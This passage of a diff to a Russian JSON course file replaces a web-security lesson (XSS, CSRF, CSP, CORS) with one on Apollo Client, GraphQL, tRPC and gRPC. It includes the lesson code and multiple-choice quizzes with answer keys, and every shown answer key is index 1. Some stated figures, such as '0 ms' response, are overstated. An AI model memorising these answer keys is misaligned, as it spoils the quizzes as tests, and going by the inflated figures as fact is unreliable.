AppSec успешно инициализирован!');",
-        "explanation": "Код предотвращает XSS-атаки через санитизацию DOMPurify и защищает сессионные токены от кражи, храня их в оперативной памяти и HttpOnly cookies."
+        "js": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Инициализация Apollo Client с нормализованным кэшем\nexport const client = new ApolloClient({\n  uri: 'https://api.store.com/graphql',\n  cache: new InMemoryCache({\n    typePolicies: {\n      Post: {\n        keyFields: ['id'], // Ключ нормализации Post:id\n      },\n    },\n  }),\n});\n\n// 2. Графическая мутация лайка\nexport const TOGGLE_LIKE_MUTATION = gql`\n  mutation ToggleLike($postId: ID!) {\n    toggleLike(postId: $postId) {\n      id\n      likesCount\n      isLiked\n    }\n  }\n`;\n\n// 3. Конфигурация для вызова с Optimistic UI\nexport function getLikeMutationConfig(postId, currentLikes) {\n  return {\n    variables: { postId },\n    optimisticResponse: {\n      toggleLike: {\n        __typename: 'Post',\n        id: postId,\n        likesCount: currentLikes + 1,\n        isLiked: true,\n      },\n    },\n    onError(err) {\n      console.error('[Apollo Error] Сбой мутации, выполнен откат кэша:', err.message);\n    },\n  };\n}\n\nconsole.log('Apollo Client с Optimistic UI успешно настроен!');",
+        "explanation": "Конфигурация нормализует посты по Post:id и обеспечивает мгновенный отклик интерфейса за 0 мс через optimisticResponse."
       }
     },
     "quiz": {
       "questions": [
         {
           "id": "pro19-q1",
-          "question": "Почему хранение сессионных JWT токенов в localStorage считается небезопасным в Enterprise-разработке?",
+          "question": "Какую главную проблему REST API решает архитектура GraphQL?",
           "options": [
-            "localStorage имеет ограничение в 5 МБ",
-            "localStorage полностью доступен для чтения любому JavaScript коду на странице, поэтому при малейшей XSS-уязвимости токен моментально похищается злоумышленником",
-            "localStorage не работает в Safari",
-            "localStorage стирается при каждом закрытии вкладки"
+            "Запрещает использование JSON",
+            "Устраняет Over-fetching (избыточную передачу ненужных полей) и Under-fetching (каскадные N+1 цепочки запросов), позволяя клиенту получить точно запрошенные связанные данные в 1 HTTP-запросе",
+            "Удаляет необходимость в сервере",
+            "Заменяет язык TypeScript"
           ],
           "correctIndex": 1,
-          "explanation": "Любой внедренный вредоносный скрипт может прочитать localStorage.getItem('token'). HttpOnly cookies скрыты от JavaScript на уровне движка браузера."
+          "explanation": "В GraphQL клиент в теле запроса строго указывает форму нужного ответа, исключая передачу лишних данных."
         },
         {
           "id": "pro19-q2",
-          "question": "Какую ключевую роль играет атрибут SameSite=Strict у cookie в защите от CSRF?",
+          "question": "По какому принципу работает нормализованный кэш InMemoryCache в Apollo Client?",
           "options": [
-            "Шифрует пароли",
-            "Запрещает браузеру автоматически отправлять cookie в запросах, инициированных с любых сторонних сайтов, полностью нейтрализуя вектор атаки CSRF",
-            "Ускоряет передачу данных",
-            "Удаляет куки через 1 час"
+            "Сохраняет HTML-код страниц",
+            "Разбивает вложенные JSON-ответы на плоские сущности по уникальному ключу '__typename:id' (например, 'User:42'), автоматически обновляя все зависимые компоненты UI при мутации любого поля",
+            "Кэширует только картинки",
+            "Стирает данные каждые 5 секунд"
           ],
           "correctIndex": 1,
-          "explanation": "SameSite=Strict блокирует передачу сессионных кук при любых переходах и запросах с чужих доменов."
+          "explanation": "Нормализация по __typename:id исключает дублирование данных и гарантирует единый источник правды для всего дерева компонентов."
         },
         {
           "id": "pro19-q3",
-          "question": "Какая библиотека является де-факто стандартом индустрии для санитизации опасного HTML перед вставкой в DOM?",
+          "question": "Что дает использование паттерна Optimistic UI в веб-приложениях?",
           "options": [
-            "Lodash",
-            "DOMPurify",
-            "Moment.js",
-            "Axios"
+            "Увеличивает размер бандла",
+            "Мгновенно обновляет пользовательский интерфейс (0 мс отклика) до получения ответа от сервера, с автоматическим откатом назад в случае сетевой ошибки",
+            "Шифрует пароли в браузере",
+            "Отключает проверку типов"
           ],
           "correctIndex": 1,
-          "explanation": "DOMPurify — признанный стандарт для очистки HTML от XSS-векторов (script, onerror, onload, javascript:)."
+          "explanation": "Optimistic UI создает ощущение мгновенной работы приложения, оптимистично предполагая успешность действия пользователя."
         },
         {
           "id": "pro19-q4",
-          "question": "Какая директива в заголовке Content-Security-Policy (CSP) защищает сайт от атак Clickjacking (встраивания в скрытый iframe)?",
+          "question": "В чем ключевое преимущество tRPC перед классическим GraphQL в Full-stack TypeScript проектах?",
           "options": [
-            "style-src 'self'",
-            "frame-ancestors 'none' (или 'self')",
-            "img-src *",
-            "upgrade-insecure-requests"
+            "tRPC работает без интернета",
+            "tRPC обеспечивает сквозную типобезопасность (End-to-End Type Safety) между бэкендом и фронтендом напрямую из TypeScript-кода без необходимости писать SDL-схемы и запускать кодогенерацию",
+            "tRPC заменяет CSS",
+            "tRPC компилируется в Java"
           ],
           "correctIndex": 1,
-          "explanation": "frame-ancestors 'none' запрещает любым сайтам рендерить страницу внутри <iframe>, блокируя атаки перехвата кликов (Clickjacking)."
+          "explanation": "tRPC импортирует типы роутера бэкенда напрямую в клиентский код, обеспечивая мгновенный автокомплит и проверку типов."
         },
         {
           "id": "pro19-q5",
-          "question": "Что отправляет браузер в качестве предварительного запроса (Preflight) перед выполнением сложного кросс-доменного CORS-запроса?",
+          "question": "За счет чего бинарный протокол gRPC-web (Protocol Buffers) превосходит текстовый REST JSON по производительности?",
           "options": [
-            "HTTP GET запрос",
-            "HTTP OPTIONS запрос для проверки разрешенных методов и заголовков на сервере",
-            "WebSocket соединение",
-            "HTTP HEAD запрос"
+            "Он удаляет JavaScript",
+            "Protobuf сериализует данные в компактный бинарный формат, который в 5-10 раз меньше по объему и парсится процессором в разы быстрее текстового JSON",
+            "Он работает только на квантовых компьютерах",
+            "Он отключает TLS-шифрование"
           ],
           "correctIndex": 1,
-          "explanation": "CORS Preflight выполняется методом OPTIONS для проверки безопасности до отправки основного запроса с телом данных."
+          "explanation": "Бинарный формат Protobuf минимизирует объем полезной нагрузки и накладные расходы на парсинг в высоконагруженных системах."
         }
       ]
     }
